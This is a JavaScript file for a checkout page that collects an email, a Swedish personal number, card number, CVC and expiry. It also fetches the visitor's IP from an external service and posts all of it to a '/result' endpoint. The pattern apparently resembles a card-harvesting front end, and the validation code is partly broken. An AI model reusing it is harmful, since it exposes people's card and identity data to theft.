// AngularJS 

// Inject Angular-Payments to validate cards
var app = angular.module('Checkout', ['angularPayments'])

// Directive to prevent user from entering digits in input field
app.directive('onlyLetters', function () {
  return {
    require: 'ngModel',
    restrict: 'A',
    link: function (scope, element, attr, ctrl) {
      function inputValue(val) {
        if (val) {
          var digits = val.replace(/[^a-zA-Z\s]/g, '');

          if (digits !== val) {
            ctrl.$setViewValue(digits);
            ctrl.$render();
          }
          return parseInt(digits, 10);
        }
        return undefined;
      }
      ctrl.$parsers.push(inputValue);
    }
  };
});

// Directive to prevent user from entering letters in input field
app.directive('onlyDigits', function () {
  return {
    require: 'ngModel',
    restrict: 'A',
    link: function (scope, element, attr, ctrl) {
      function inputValue(val) {
        if (val) {
          var digits = val.replace(/[^\d.-]/g, '');

          if (digits !== val) {
            ctrl.$setViewValue(digits);
            ctrl.$render();
          }
          return parseInt(digits, 10);
        }
        return undefined;
      }
      ctrl.$parsers.push(inputValue);
    }
  };
});

// Payment Controller
app.controller('PaymentsCtrl', function ($scope, $http, $location) {
  // fetching client I.P externally
  var json = 'http://ipv4.myexternalip.com/json';
  $http.get(json).then(function (result) {
    $scope.card = {};
    $scope.processForm = function () {
      // Post data to express server
      $http({
        method: 'POST',
        url: '/result',
        data: {
          email: $scope.card.email,
          personal_nummer: $scope.card.nummer,
          card_number: $scope.card.number,
          card_cvc: $scope.card.cvc,
          card_expiry: $scope.card.expiry,
          ip: result.data.ip
        }
      })
    };
  })
});

// Jquery

// Slide UI 
var $field = $('input')

$field.on('focus', function () {
  $(this).parent().addClass('focus');
  $(this).parent().removeClass('active');
})

$field.on('blur', function () {
  $(this).parent().removeClass('focus');

  if ($(this).val() !== '') {
    $(this).parent().addClass('active');
  } else {
    $(this).parent().removeClass('active');
  }
});

// Cleave validates personal Nummer
var cleaveCustom = new Cleave('.swedish-number', {
  blocks: [6, 4],
  delimiter: '-',
});

// Slice and validate expiry date input field
function checkNumberFieldLength(elem) {
  if (elem.value.length > 6) {
    elem.value = elem.value.slice(0, 7);
    var year = elem.value.split('/')
    if (year[1] > 27) {
      alert('The card expiry year must be before the year 2027')
      return elem.value = ''
    }
    if (year[0] == 00 || year[0] > 12) {
      alert('The card expiry month must be between 01 and 12')
      return elem.value = ''
    }    
  }
}

// Slice and validate CVV input field
function checkCvvFieldLength(elem) {
  if (elem.value.length > 3) {
    elem.value = elem.value.slice(0, 3);
  }
}

// Validate Personal Nummer
function checkPnFieldLength(elem) {
  var i = elem.value.match(/.{1,2}/g);
  if (i[3] == '' || i[4] == '' || i[5] == '') {
    console.log('error')
  }
}